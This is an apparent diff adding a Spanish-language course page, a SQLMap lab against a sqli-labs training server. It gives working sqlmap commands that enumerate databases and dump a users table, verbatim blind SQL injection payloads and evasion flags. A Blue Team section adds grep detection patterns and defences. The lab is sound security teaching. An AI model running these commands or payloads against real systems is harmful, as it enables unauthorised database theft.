@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Guía: SQLMap — Automatización de SQL Injection | CRD</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="assets/css/estilos.css">
+</head>
+<body>
+<main>
+  <div data-include="aviso-etico"></div>
+
+  <h1>🤖 Laboratorio: SQLMap — Automatización de SQL Injection (Red &amp; Blue Team)</h1>
+
+  <p>
+    Este laboratorio demuestra cómo SQLMap automatiza exactamente lo que hiciste manualmente
+    en el laboratorio anterior. No es una herramienta mágica: es un script que envía los mismos
+    payloads que construiste a mano, solo que más rápido y de forma sistemática.
+  </p>
+  <p>
+    El objetivo no es aprender a usar SQLMap como caja negra. Es reconocer en su output
+    los mismos patrones que ya entiendes, y entender por qué la automatización no reemplaza
+    el conocimiento manual — lo amplifica.
+  </p>
+
+  <div style="background-color: #3d1515; padding: 15px; border-left: 5px solid #ff4444; margin-bottom: 20px;">
+    <strong>⚠️ Regla del laboratorio:</strong> SQLMap solo se usa en este laboratorio
+    contra el servidor del curso <code>http://159.112.137.106/sqli-labs/</code>.
+    Ejecutar SQLMap contra cualquier otro sistema sin autorización escrita es ilegal
+    en la mayoría de jurisdicciones, independientemente de si el sistema parece vulnerable.
+  </div>
+
+  <h2>🗺️ Mapeo de Técnicas MITRE ATT&CK</h2>
+
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Táctica</th>
+        <th>Técnica</th>
+        <th>Código MITRE</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Acceso Inicial</strong></td>
+        <td>Exploit Public-Facing Application</td>
+        <td><code>T1190</code></td>
+      </tr>
+      <tr>
+        <td><strong>Descubrimiento</strong></td>
+        <td>Software Discovery</td>
+        <td><code>T1518</code></td>
+      </tr>
+      <tr>
+        <td><strong>Recolección</strong></td>
+        <td>Data from Information Repositories</td>
+        <td><code>T1213</code></td>
+      </tr>
+      <tr>
+        <td><strong>Credential Access</strong></td>
+        <td>Credentials from Password Stores</td>
+        <td><code>T1555</code></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <h2>🏗️ Arquitectura del Laboratorio</h2>
+
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Componente</th>
+        <th>Detalle</th>
+        <th>Rol</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Servidor objetivo</strong></td>
+        <td><code>http://159.112.137.106/sqli-labs/</code></td>
+        <td>Aplicación PHP/MySQL vulnerable — mismo servidor del lab anterior</td>
+      </tr>
+      <tr>
+        <td><strong>SQLMap</strong></td>
+        <td>Versión 1.7+</td>
+        <td>Herramienta de detección y explotación automática de SQLi</td>
+      </tr>
+      <tr>
+        <td><strong>Lecciones usadas</strong></td>
+        <td>Less-1, Less-8, Less-9</td>
+        <td>In-band, Boolean Blind y Time-based — las tres técnicas del lab anterior</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Prerequisito:</strong> Este laboratorio asume que ya completaste el laboratorio
+    de SQL Injection manual. Si no identificaste el delimitador, no enumeraste tablas manualmente
+    y no extrajiste datos con UNION, completa ese laboratorio primero.
+    SQLMap sin esa base es una caja negra sin valor de aprendizaje.
+  </div>
+
+  <hr>
+
+  <h2>📖 Concepto Previo: Qué es SQLMap y Qué Hace por Dentro</h2>
+
+  <p>
+    SQLMap es una herramienta open source escrita en Python que automatiza la detección
+    y explotación de vulnerabilidades SQL Injection. No tiene ningún poder especial:
+    envía requests HTTP con payloads SQL, analiza las respuestas y repite el proceso
+    sistemáticamente hasta extraer lo que busca.
+  </p>
+
+  <p>
+    Internamente, SQLMap hace exactamente lo mismo que hiciste a mano en el laboratorio anterior,
+    en este orden:
+  </p>
+
+  <p>
+    <strong>1. Detecta el delimitador:</strong> Prueba comilla simple, comilla doble, paréntesis
+    y combinaciones hasta encontrar cuál rompe la consulta y cuál la cierra correctamente.
+    Tú hiciste esto en los Pasos 1, 2 y 3 de Less-1.
+  </p>
+
+  <p>
+    <strong>2. Identifica la técnica disponible:</strong> Prueba si hay canal visual (Union-based),
+    si hay errores (Error-based), si hay diferencia en la respuesta (Boolean Blind) o si solo
+    hay diferencia en el tiempo (Time-based). Aplica la técnica más eficiente disponible.
+  </p>
+
+  <p>
+    <strong>3. Enumera el esquema:</strong> Consulta <code>information_schema</code> para listar
+    bases de datos, tablas y columnas. Exactamente las mismas consultas que construiste en los
+    Pasos 7 y 8 del laboratorio anterior.
+  </p>
+
+  <p>
+    <strong>4. Extrae los datos:</strong> Usa <code>GROUP_CONCAT</code>, <code>LIMIT/OFFSET</code>
+    o búsqueda binaria (según la técnica) para volcar el contenido de las tablas.
+    El mismo proceso que tu script Python hacía carácter por carácter en Less-8.
+  </p>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 La diferencia clave:</strong> SQLMap hace todo esto en segundos y maneja
+    automáticamente casos borde, encodings, WAFs básicos y variaciones de respuesta.
+    Un humano tarda minutos o horas en el mismo proceso. Pero si no entiendes qué hace
+    cada paso, no puedes interpretar sus resultados ni adaptarlo cuando falla.
+  </div>
+
+  <hr>
+
+  <h2>🔧 Instalación y Verificación</h2>
+
+  <p>
+    SQLMap viene preinstalado en Kali Linux. Si estás en otro sistema:
+  </p>
+
+  <pre><code># Verificar que está instalado
+sqlmap --version
+# Resultado esperado: sqlmap/1.7.x#stable
+
+# Si no está instalado
+sudo apt install sqlmap -y
+
+# Alternativa: clonar desde GitHub (versión más reciente)
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+python3 sqlmap.py --version</code></pre>
+
+  <hr>
+
+  <h2>🔴 PARTE 1 — Detección y Enumeración Básica (Less-1)</h2>
+
+  <p>
+    Empezamos con Less-1 porque ya sabes exactamente qué hay ahí: delimitador comilla simple,
+    3 columnas, base de datos <code>security</code>, tabla <code>users</code>.
+    Vas a ver cómo SQLMap llega a las mismas conclusiones automáticamente.
+  </p>
+
+  <h3>Paso 1 — Detectar si el parámetro es inyectable</h3>
+
+  <p>
+    El flag <code>--batch</code> hace que SQLMap use las opciones por defecto en cada pregunta
+    sin esperar confirmación del usuario. Útil para laboratorio; en un pentest real
+    conviene revisar cada decisión.
+  </p>
+
+  <pre><code>sqlmap -u "http://159.112.137.106/sqli-labs/Less-1/?id=1" --batch</code></pre>
+
+  <p>SQLMap va a mostrar algo como esto en su output:</p>
+
+  <pre><code>[INFO] testing connection to the target URL
+[INFO] testing if the target URL content is stable
+[INFO] target URL content is stable
+[INFO] testing if GET parameter 'id' is dynamic
+[INFO] GET parameter 'id' appears to be dynamic
+[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
+[INFO] testing for SQL injection on GET parameter 'id'
+[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[INFO] GET parameter 'id' appears to be 'AND boolean-based blind' injectable
+[INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based' injectable
+[INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 3 columns' injectable</code></pre>
+
+  <p>
+    Observa la última línea: SQLMap detectó automáticamente que la consulta tiene
+    <strong>3 columnas</strong>. Tú tardaste 4 requests con ORDER BY para llegar a esa conclusión.
+    SQLMap lo hace en el mismo proceso de detección.
+  </p>
+
+  <h3>Paso 2 — Listar bases de datos disponibles</h3>
+
+  <pre><code>sqlmap -u "http://159.112.137.106/sqli-labs/Less-1/?id=1" --dbs --batch</code></pre>
+
+  <p>Resultado esperado:</p>
+
+  <pre><code>[INFO] fetching database names
+available databases [4]:
+[*] information_schema
+[*] challenges
+[*] mysql
+[*] security</code></pre>
+
+  <p>
+    Aparecen 4 bases de datos. <code>information_schema</code> y <code>mysql</code> son del sistema.
+    <code>security</code> es la de sqli-labs. <code>challenges</code> es otra base de datos
+    del servidor. El atacante real exploraría todas.
+  </p>
+
+  <h3>Paso 3 — Listar tablas de la base de datos security</h3>
+
+  <pre><code>sqlmap -u "http://159.112.137.106/sqli-labs/Less-1/?id=1" -D security --tables --batch</code></pre>
+
+  <p>Resultado esperado:</p>
+
+  <pre><code>Database: security
+[4 tables]
++-----------+
+| emails    |
+| referers  |
+| uagents   |
+| users     |
++-----------+</code></pre>
+
+  <h3>Paso 4 — Listar columnas de la tabla users</h3>
+
+  <pre><code>sqlmap -u "http://159.112.137.106/sqli-labs/Less-1/?id=1" -D security -T users --columns --batch</code></pre>
+
+  <p>Resultado esperado:</p>
+
+  <pre><code>Database: security
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(3)      |
+| password | varchar(20) |
+| username | varchar(20) |
++----------+-------------+</code></pre>
+
+  <h3>Paso 5 — Volcar la tabla users completa</h3>
+
+  <pre><code>sqlmap -u "http://159.112.137.106/sqli-labs/Less-1/?id=1" -D security -T users --dump --batch</code></pre>
+
+  <p>Resultado esperado:</p>
+
+  <pre><code>Database: security
+Table: users
+[13 entries]
++----+------------+----------+
+| id | password   | username |
++----+------------+----------+
+| 1  | Dumb       | Dumb     |
+| 2  | I-kill-you | Angelina |
+| 3  | p@ssword   | Dummy    |
+| 4  | crappy     | secure   |
+| 5  | stupidity  | stupid   |
+| 6  | genious    | superman |
+| 7  | mob!le     | batman   |
+| 8  | admin      | admin    |
+...
++----+------------+----------+</code></pre>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Observa el tiempo:</strong> Desde el Paso 1 hasta el Paso 5, SQLMap tardó
+    aproximadamente 30-60 segundos en extraer toda la tabla. Tu script Python de Less-8
+    tardaba varios minutos solo para extraer un hash. La automatización tiene un costo:
+    genera mucho más tráfico en menos tiempo, lo que lo hace más detectable por un SIEM
+    o un IDS que esté monitoreando el servidor.
+  </div>
+
+  <hr>
+
+  <h2>🔴 PARTE 2 — Técnicas Específicas con Verbose (Less-8 y Less-9)</h2>
+
+  <p>
+    Esta es la parte más importante del laboratorio. Vas a forzar a SQLMap a usar
+    solo la técnica que practicaste manualmente y ver los payloads exactos que envía.
+    Reconocerás los mismos patrones de tu script Python.
+  </p>
+
+  <h3>Paso 1 — Boolean Blind contra Less-8 con payloads visibles</h3>
+
+  <p>
+    El flag <code>--technique=B</code> limita SQLMap a Boolean-based Blind únicamente.
+    El flag <code>-v 3</code> muestra cada payload que envía en tiempo real.
+  </p>
+
+  <pre><code>sqlmap -u "http://159.112.137.106/sqli-labs/Less-8/?id=1" \
+  --technique=B \
+  -D security -T users --dump \
+  --batch \
+  -v 3</code></pre>
+
+  <p>
+    Con <code>-v 3</code> verás en el output algo como esto para cada carácter que extrae:
+  </p>
+
+  <pre><code>[PAYLOAD] 1 AND ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20)
+FROM security.users ORDER BY id LIMIT 0,1),1,1))>64
+[PAYLOAD] 1 AND ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20)
+FROM security.users ORDER BY id LIMIT 0,1),1,1))>96
+[PAYLOAD] 1 AND ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20)
+FROM security.users ORDER BY id LIMIT 0,1),1,1))>112
+[PAYLOAD] 1 AND ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20)
+FROM security.users ORDER BY id LIMIT 0,1),1,1))>68
+[PAYLOAD] 1 AND ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20)
+FROM security.users ORDER BY id LIMIT 0,1),1,1))>68</code></pre>
+
+  <p>
+    Reconoces el patrón: <code>ORD(MID(...))</code> es equivalente a <code>ASCII(SUBSTRING(...))</code>
+    que usaste en tu script Python. SQLMap compara el valor numérico del carácter usando
+    búsqueda binaria, exactamente como implementaste manualmente. La diferencia es que SQLMap
+    optimiza el número de requests y maneja automáticamente los casos borde.
+  </p>
+
+  <h3>Paso 2 — Time-Based Blind contra Less-9</h3>
+
+  <pre><code>sqlmap -u "http://159.112.137.106/sqli-labs/Less-9/?id=1" \
+  --technique=T \
+  --current-db \
+  --batch \
+  -v 3</code></pre>
+
+  <p>Con <code>-v 3</code> verás los payloads con SLEEP:</p>
+
+  <pre><code>[PAYLOAD] 1 AND SLEEP(5)
+[PAYLOAD] 1' AND SLEEP(5) AND 'abc'='abc
+[PAYLOAD] 1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
+...</code></pre>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Por qué time-based es más lento en SQLMap:</strong>
+    SQLMap usa por defecto <code>SLEEP(5)</code> para time-based. Para extraer un solo carácter
+    necesita múltiples requests de 5 segundos cada uno. Extraer la tabla users completa
+    por time-based puede tardar varios minutos. Boolean-based es siempre preferible
+    cuando está disponible porque no depende del tiempo de respuesta.
+  </div>
+
+  <hr>
+
+  <h2>🔴 PARTE 3 — Información del Sistema</h2>
+
+  <p>
+    SQLMap puede extraer información del servidor MySQL más allá de los datos de la aplicación.
+    Esta información es valiosa en un pentest para entender el alcance del compromiso.
+  </p>
+
+  <h3>Extraer información del motor en un solo comando</h3>
+
+  <pre><code>sqlmap -u "http://159.112.137.106/sqli-labs/Less-1/?id=1" \
+  --current-user \
+  --current-db \
+  --banner \
+  --batch</code></pre>
+
+  <p>Resultado esperado:</p>
+
+  <pre><code>[INFO] fetching banner
+[INFO] fetching current user
+[INFO] fetching current database
+
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4, PHP 5.5
+back-end DBMS: MySQL >= 5.0
+banner: '5.7.x-log'
+current user: 'root@localhost'
+current database: 'security'</code></pre>
+
+  <div style="background-color: #3d1515; padding: 15px; border-left: 5px solid #ff4444; margin-bottom: 20px;">
+    <strong>⚠️ Punto crítico para el debate Blue Team:</strong> El current user es <code>root@localhost</code>.
+    Esto significa que la aplicación web se conecta a MySQL con el usuario root, que tiene
+    privilegios totales sobre todas las bases de datos del servidor.
+    Un atacante con este nivel de acceso puede leer cualquier base de datos,
+    escribir archivos al sistema y potencialmente ejecutar comandos del sistema operativo.
+    Este es exactamente el escenario que el principio de mínimo privilegio previene.
+  </div>
+
+  <hr>
+
+  <h2>🔴 PARTE 4 — Reto Final</h2>
+
+  <p>
+    Construye tú solo el comando SQLMap que cumpla estas tres condiciones al mismo tiempo,
+    sin consultar los pasos anteriores:
+  </p>
+
+  <ul>
+    <li>Usar Less-8 como objetivo (Boolean Blind)</li>
+    <li>Extraer únicamente la contraseña del usuario <code>batman</code></li>
+    <li>Mostrar los payloads en tiempo real</li>
+  </ul>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Pistas si estás bloqueado:</strong><br><br>
+    — ¿Qué flag de SQLMap limita los resultados a una fila que cumple una condición?<br>
+    — Ejecuta <code>sqlmap --help | grep where</code> para ver opciones de filtrado.<br>
+    — El resultado debe mostrar solo <code>mob!le</code> en la columna password.
+  </div>
+
+  <p>Solución esperada:</p>
+
+  <pre><code>sqlmap -u "http://159.112.137.106/sqli-labs/Less-8/?id=1" \
+  --technique=B \
+  -D security -T users -C password \
+  --where="username='batman'" \
+  --dump \
+  --batch \
+  -v 3</code></pre>
+
+  <hr>
+
+  <h2>📊 Comparativa: Manual vs SQLMap</h2>
+
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Acción</th>
+        <th>Manual (Less-8)</th>
+        <th>SQLMap</th>
+        <th>Diferencia</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Identificar delimitador</td>
+        <td>4-8 requests manuales</td>
+        <td>Automático en detección inicial</td>
+        <td>SQLMap más rápido</td>
+      </tr>
+      <tr>
+        <td>Extraer nombre de BD</td>
+        <td>~56 requests (script Python)</td>
+        <td>~40 requests</td>
+        <td>Similar</td>
+      </tr>
+      <tr>
+        <td>Extraer tabla users completa</td>
+        <td>~15 minutos con script</td>
+        <td>~60 segundos</td>
+        <td>SQLMap mucho más rápido</td>
+      </tr>
+      <tr>
+        <td>Detección por IDS/WAF</td>
+        <td>Baja — requests espaciados</td>
+        <td>Alta — volumen en ráfaga</td>
+        <td>Manual más sigiloso</td>
+      </tr>
+      <tr>
+        <td>Comprensión del proceso</td>
+        <td>Total</td>
+        <td>Ninguna sin base previa</td>
+        <td>Manual irremplazable para aprendizaje</td>
+      </tr>
+      <tr>
+        <td>Adaptabilidad a casos borde</td>
+        <td>Depende del conocimiento</td>
+        <td>Alta — múltiples técnicas automáticas</td>
+        <td>SQLMap más robusto</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <h2>🔵 Blue Team: Cómo Detectar SQLMap en la Red</h2>
+
+  <p>
+    SQLMap genera patrones de tráfico muy característicos que un Blue Team bien configurado
+    puede detectar en tiempo real.
+  </p>
+
+  <h3>Señal 1 — User-Agent por defecto</h3>
+  <p>
+    SQLMap envía por defecto un User-Agent que lo identifica explícitamente:
+  </p>
+  <pre><code>User-Agent: sqlmap/1.7.x (https://sqlmap.org)</code></pre>
+  <p>
+    Cualquier WAF o regla de IDS que filtre este string bloqueará SQLMap inmediatamente.
+    Los atacantes más sofisticados usan <code>--random-agent</code> para evitar esto,
+    pero es el punto de detección más fácil.
+  </p>
+
+  <h3>Señal 2 — Volumen de requests en ráfaga</h3>
+  <p>
+    SQLMap puede generar cientos de requests en pocos segundos contra el mismo parámetro.
+    Una regla de rate limiting que dispare alerta cuando una IP supera 50 requests
+    por minuto al mismo endpoint es suficiente para detectarlo.
+  </p>
+
+  <h3>Señal 3 — Payloads característicos en los logs</h3>
+  <p>
+    El access log del servidor web registra cada URL solicitada. Los payloads de SQLMap
+    son reconocibles: <code>AND SLEEP(5)</code>, <code>ORDER BY</code> incrementales,
+    <code>UNION SELECT NULL</code>, <code>information_schema</code> en parámetros.
+  </p>
+
+  <pre><code># Buscar en access log señales de SQLMap
+grep -i "sleep\|union\|information_schema\|order by" /var/log/apache2/access.log
+
+# Contar requests por IP en el último minuto
+awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head</code></pre>
+
+  <h3>Medidas defensivas específicas contra SQLMap</h3>
+
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Medida</th>
+        <th>Qué bloquea</th>
+        <th>Limitación</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Filtrar User-Agent de SQLMap</td>
+        <td>SQLMap sin modificar</td>
+        <td>SQLMap con <code>--random-agent</code> lo evita</td>
+      </tr>
+      <tr>
+        <td>Rate limiting por IP</td>
+        <td>Ráfagas automáticas</td>
+        <td>SQLMap con <code>--delay</code> lo evita</td>
+      </tr>
+      <tr>
+        <td>WAF con reglas OWASP CRS</td>
+        <td>Payloads conocidos</td>
+        <td>SQLMap con <code>--tamper</code> puede evadirlo</td>
+      </tr>
+      <tr>
+        <td>Prepared Statements en el código</td>
+        <td>Toda SQLi, incluyendo SQLMap</td>
+        <td>Ninguna — es la única defensa absoluta</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <h2>💡 Lecciones Aprendidas</h2>
+  <ul>
+    <li>
+      <strong>SQLMap hace lo mismo que hiciste manualmente, más rápido:</strong>
+      Los payloads que ves con <code>-v 3</code> son variaciones de los mismos patrones
+      que construiste en Less-8. La herramienta no tiene magia; tiene automatización.
+    </li>
+    <li>
+      <strong>El conocimiento manual es prerequisito, no alternativa:</strong>
+      Sin entender qué hace cada payload, no puedes interpretar los resultados de SQLMap,
+      adaptarlo cuando falla, ni explicar el hallazgo a un cliente en un informe de pentest.
+    </li>
+    <li>
+      <strong>SQLMap es más detectable que el ataque manual:</strong>
+      El volumen de requests en ráfaga y el User-Agent por defecto lo hacen fácilmente
+      identificable por cualquier sistema de monitoreo básico.
+    </li>
+    <li>
+      <strong>La única defensa que detiene SQLMap completamente son los Prepared Statements:</strong>
+      Rate limiting, WAFs y filtros de User-Agent son mitigaciones parciales.
+      Si el código no concatena input en SQL, SQLMap no tiene nada que explotar.
+    </li>
+    <li>
+      <strong>El usuario de base de datos importa:</strong>
+      Que SQLMap encuentre <code>current-user: root</code> significa que un atacante real
+      tendría acceso total al servidor de base de datos, no solo a la aplicación.
+      El principio de mínimo privilegio en la conexión de base de datos limita este riesgo.
+    </li>
+  </ul>
+
+  <hr>
+
+  <h2>📚 Referencias</h2>
+  <ul>
+    <li>SQLMap — Repositorio oficial: <a href="https://github.com/sqlmapproject/sqlmap" target="_blank">https://github.com/sqlmapproject/sqlmap</a></li>
+    <li>SQLMap documentación: <a href="https://sqlmap.org" target="_blank">https://sqlmap.org</a></li>
+    <li>OWASP SQLi Testing Guide: <a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank">https://owasp.org/www-project-web-security-testing-guide/</a></li>
+    <li>MITRE T1190 — Exploit Public-Facing Application: <a href="https://attack.mitre.org/techniques/T1190/" target="_blank">https://attack.mitre.org/techniques/T1190/</a></li>
+  </ul>
+
+  <section>
+    <h2>Ejercicios de Control</h2>
+    <div class="iframe-wrapper">
+      <iframe src="https://app.lumi.education/api/v1/run/TU_CODIGO_AQUI/embed" width="1088" height="400" frameborder="0" allowfullscreen="allowfullscreen"></iframe>
+    </div>
+  </section>
+
+  <form id="form-reportar" class="form-horizontal">
+    <input type="hidden" id="titulo" name="titulo" value="SQLMap — Automatización de SQL Injection">
+    <input type="hidden" id="archivo" name="archivo" value="guia_sqlmap.html">
+    <input type="hidden" id="fecha" name="fecha">
+    <textarea id="comentario" name="comentario" placeholder="¿Tuviste problemas instalando SQLMap, ejecutando algún comando o interpretando el output? Describí el error aquí." required></textarea>
+    <button type="submit">Enviar Reporte</button>
+  </form>
+
+  <div id="mensaje-envio" style="margin-top:10px; color: green;"></div>
+
+</main>
+<div data-include="footer"></div>
+<script src="assets/js/scripts.js"></script>
+</body>
+</html>
